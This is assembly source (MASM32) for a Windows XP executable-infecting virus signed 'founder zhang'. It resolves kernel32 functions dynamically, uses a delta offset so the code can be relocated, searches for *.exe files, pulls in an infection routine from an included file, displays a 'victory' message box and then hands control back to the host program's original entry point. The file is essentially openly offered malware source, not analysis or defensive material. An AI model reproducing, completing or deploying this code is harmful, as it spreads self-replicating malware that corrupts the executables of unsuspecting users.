; founder zhang
; MASM32 asm program for Intel i386 processors running Windows xp
; By founder

.386
.model flat, stdcall
option casemap:none

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc

.code

begin_copy:



    oldEntryPoint       dd 0
    msgOfVictory        db "founder zhang", 0

    kernel32_dll_name   db "Kernel32.dll", 0
    user32_dll_name     db "User32.dll", 0
    getProcAddress_name db "GetProcAddress", 0
    loadLibrary_name    db "LoadLibraryA", 0

    file_regex          db "*.exe", 0

; Function names
    closehandle_name    db "CloseHandle", 0
    createfile_name     db "CreateFileA", 0
    findclose_name      db "FindClose", 0
    findfirstfile_name  db "FindFirstFileA", 0
    findnextfile_name   db "FindNextFileA", 0
    getfilesize_name    db "GetFileSize", 0
    messagebox_name     db "MessageBoxA", 0
    readfile_name       db "ReadFile", 0
    setfilepointer_name db "SetFilePointer", 0
    virtualalloc_name   db "VirtualAlloc", 0
    virtualfree_name    db "VirtualFree", 0
    writefile_name      db "WriteFile", 0



include utils.asm
include infect_file.asm



start:                                    

    mov  esi, [esp]                        

main PROC NEAR

    LOCAL getProcAddress_addr:DWORD
    LOCAL loadLibrary_addr:DWORD
    LOCAL imageBase:DWORD
    LOCAL filehandle:DWORD
    LOCAL fileptr:DWORD
    LOCAL filesearchhandle:DWORD
    LOCAL filesize:DWORD
    LOCAL win32finddata:WIN32_FIND_DATA

; Function addresses
    LOCAL closehandle_addr:DWORD
    LOCAL createfile_addr:DWORD
    LOCAL findclose_addr:DWORD
    LOCAL findfirstfile_addr:DWORD
    LOCAL findnextfile_addr:DWORD
    LOCAL getfilesize_addr:DWORD
    LOCAL messagebox_addr:DWORD
    LOCAL readfile_addr:DWORD
    LOCAL setfilepointer_addr:DWORD
    LOCAL virtualalloc_addr:DWORD
    LOCAL virtualfree_addr:DWORD
    LOCAL writefile_addr:DWORD
	LOCAL dwRead:DWORD
    call delta_offset                      
delta_offset:
    pop  ebx
    sub  ebx, delta_offset                

include search_k32.asm                    


LOADFUNC MACRO fct_name, dll_name, result_container
    lea  edx, [ebx + offset dll_name]      ;
    push edx                               ;
    call loadLibrary_addr                  ;
    lea  edx, [ebx + offset fct_name]      ;
    push edx                               ;
    push eax                               ;
    call getProcAddress_addr               ;
    mov  result_container, eax             ; 
ENDM



    LOADFUNC closehandle_name,    kernel32_dll_name, closehandle_addr
    LOADFUNC createfile_name,     kernel32_dll_name, createfile_addr
    LOADFUNC findclose_name,      kernel32_dll_name, findclose_addr
    LOADFUNC findfirstfile_name,  kernel32_dll_name, findfirstfile_addr
    LOADFUNC findnextfile_name,   kernel32_dll_name, findnextfile_addr
    LOADFUNC getfilesize_name,    kernel32_dll_name, getfilesize_addr
    LOADFUNC messagebox_name,     user32_dll_name,   messagebox_addr
    LOADFUNC readfile_name,       kernel32_dll_name, readfile_addr
    LOADFUNC setfilepointer_name, kernel32_dll_name, setfilepointer_addr
    LOADFUNC virtualalloc_name,   kernel32_dll_name, virtualalloc_addr
    LOADFUNC virtualfree_name,    kernel32_dll_name, virtualfree_addr
    LOADFUNC writefile_name,      kernel32_dll_name, writefile_addr


    push 0                                 ;
    lea  ecx, [ebx + offset msgOfVictory]  ;
    push ecx                               ;
    push ecx                               ;
    push 0                                 ;
    call messagebox_addr                   ; Msgbox of VICTORY !!!



include search_files.asm                   

    mov  ecx, [ebx + oldEntryPoint]       
    cmp  ecx, 0
    je   exit                              

    call search_imgbase_get_eip
search_imgbase_get_eip:
    pop  esi                              
    and  esi, 0FFFF0000h                   
    cmp  word ptr [esi], "ZM"
    je   search_imgbase_end
search_imgbase:
    sub  esi, 01000h                      
    cmp  word ptr [esi], "ZM"             
    jne  search_imgbase
search_imgbase_end:
    add  esi, ecx                         

    leave                                 
    jmp  esi                              

exit:
    ret
main ENDP

end_copy:
    ret
end start
